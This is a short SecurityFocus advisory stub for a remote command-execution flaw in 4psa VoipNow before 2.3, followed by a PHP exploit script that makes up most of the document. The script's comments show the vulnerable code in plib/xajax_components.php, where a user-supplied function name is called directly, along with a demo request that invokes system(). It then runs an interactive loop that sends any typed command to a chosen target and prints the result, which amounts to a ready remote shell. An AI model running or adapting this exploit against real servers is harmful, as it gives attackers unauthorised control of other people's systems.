source: http://www.securityfocus.com/bid/57032/info

VoipNow Service Provider Edition is prone to a remote arbitrary command-execution vulnerability because it fails to properly validate user-supplied input.

An attacker can exploit this issue to execute arbitrary commands within the context of the vulnerable application.

Versions of VoipNow Service Provider Edition prior to 2.3 are vulnerable; other versions may also affected. 

<?
# Title: 4psa VoipNow < 2.3 , Remote Command Execution vuln
# Software Link: http://www.4psa.com/products-4psavoipnow.html
# Author: Faris , aka i-Hmx
# Home : sec4ever.com , 1337s.cc
# Mail : n0p1337@gmail.com
# Tested on: VoipNow dist.
/*
VoipNow suffer from critical RCE vuln.
Vulnerable File : plib/xajax_components.php
Snip.
if ( isset( $_GET['varname'] ) )
{
$func_name = $_GET['varname'];
$func_arg = $_POST["fid-".$_GET['varname']];
$func_params = $_GET;
if ( function_exists( $func_name ) )
{
echo $func_name( $func_arg, $func_params );
}
else
{
echo "<ul><li>Function: ".$func_name." does not exist.</li></ul>";
}
}
Demo Exploit :
Get : plib/xajax_components.php?varname=system
Post : fid-system=echo WTF!!
so the result is
echo system( 'echo WTF!!', array() );
the system var need just the 1st parameter
so don't give fu#* about the array :D
Peace out
*/
echo "\n+-------------------------------------------+\n";
echo "| VoipNow 2.5.3 |\n";
echo "| Remote Command Execution Exploit |\n";
echo "| By i-Hmx |\n";
echo "| n0p1337@gmail.com |\n";
echo "+-------------------------------------------+\n";
echo "\n| Enter Target [https://ip] # ";
$target=trim(fgets(STDIN));
function faget($url,$post){
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
curl_setopt($curl, CURLOPT_COOKIEFILE, '/');
curl_setopt($curl, CURLOPT_COOKIEJAR, '/');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
curl_setopt($curl,CURLOPT_TIMEOUT,20);
curl_setopt($curl, CURLOPT_HEADER, false);
$exec=curl_exec($curl);
curl_close($curl);
return $exec;
}
while(1)
{
echo "\ni-Hmx@".str_replace("https://","",$target)."# ";
$cmd=trim(fgets(STDIN));
if($cmd=="exit"){exit();}
$f_rez=faget($target."/plib/xajax_components.php?varname=system","fid-system=$cmd");
echo $f_rez;
}
# NP : Just cleaning my pc from an old old trash , The best is yet to come ;)
?>